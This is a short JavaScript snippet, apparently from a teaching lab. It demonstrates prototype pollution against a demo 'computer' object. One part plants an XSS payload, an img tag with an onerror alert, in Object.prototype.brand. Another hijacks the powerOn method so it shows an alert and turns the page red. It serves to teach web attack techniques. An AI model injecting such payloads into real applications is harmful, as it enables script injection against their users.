// Basic Prototype pollution

Object.prototype.brand = "<img src=x onerror='alert(\"XSS\")'>";
delete computer.brand;
computer.powerOn(); // This will now use the XSS payload in the status message


// Method Hijacking

Object.prototype.powerOn = function() {
  alert("Hijacked the power button!");
  document.body.style.backgroundColor = "red";
};
// Now click the Power On button